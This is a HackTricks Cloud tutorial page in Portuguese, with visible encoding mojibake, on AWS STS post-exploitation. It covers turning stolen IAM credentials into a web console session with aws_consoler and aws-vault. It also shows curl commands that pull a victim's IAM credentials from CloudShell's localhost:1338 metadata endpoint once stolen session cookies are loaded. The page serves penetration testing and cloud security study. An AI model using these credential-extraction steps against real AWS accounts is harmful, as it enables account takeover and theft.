# AWS - P√≥s-Explora√ß√£o do STS

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>

## STS

Para mais informa√ß√µes:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### Das Credenciais IAM para o Console

#### aws\_consoler

Se voc√™ conseguiu obter algumas credenciais IAM, pode estar interessado em acessar o console da web. Voc√™ pode **gerar um link para o console da web** com [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).

```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #Isso ir√° gerar um link para fazer login no console
```

{% hint style="warning" %}
Certifique-se de que o usu√°rio IAM tenha permiss√£o `sts:GetFederationToken`, ou forne√ßa uma fun√ß√£o para assumir.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) √© uma ferramenta para armazenar e acessar com seguran√ßa as credenciais da AWS em um ambiente de desenvolvimento.

```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute o aws cli com as credenciais de jonsmith
aws-vault login jonsmith # Abra um navegador logado como jonsmith
```

{% hint style="info" %}
Voc√™ tamb√©m pode usar o **aws-vault** para obter uma **sess√£o do console do navegador**
{% endhint %}

#### Do Console para as Credenciais IAM

Se voc√™ conseguir comprometer algum acesso a um console da web (talvez tenha roubado cookies e n√£o conseguiu acessar a pasta .aws), pode obter algumas credenciais de token IAM para esse usu√°rio por meio do **CloudShell**.

O CloudShell exp√µe as credenciais IAM por meio de um **endpoint n√£o documentado na porta 1338**. Depois de carregar os cookies da sess√£o da v√≠tima em seu navegador, voc√™ pode navegar at√© o CloudShell e emitir os seguintes comandos para obter as credenciais IAM.

```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou se deseja acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).

* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no Github.

</details>